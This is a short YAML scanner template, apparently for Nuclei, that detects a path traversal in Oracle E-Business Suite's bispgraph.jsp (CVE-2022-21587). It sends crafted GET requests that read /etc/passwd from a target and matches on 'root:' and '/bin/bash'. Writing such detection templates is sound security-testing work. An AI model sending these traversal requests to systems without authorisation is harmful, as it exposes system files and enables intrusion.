id: poc-yaml-oracle-e-business-suite-bispgraphjsp-path-traversal

info:
  name: Oracle E-Business Suite bispgraph.jsp Path Traversal
  author: ProjectDiscoveryAI
  severity: high
  tags: CVE-2022-21587,path-traversal,oracle

variables:
  path:
    - OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
    - OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin/bash"
        part: body
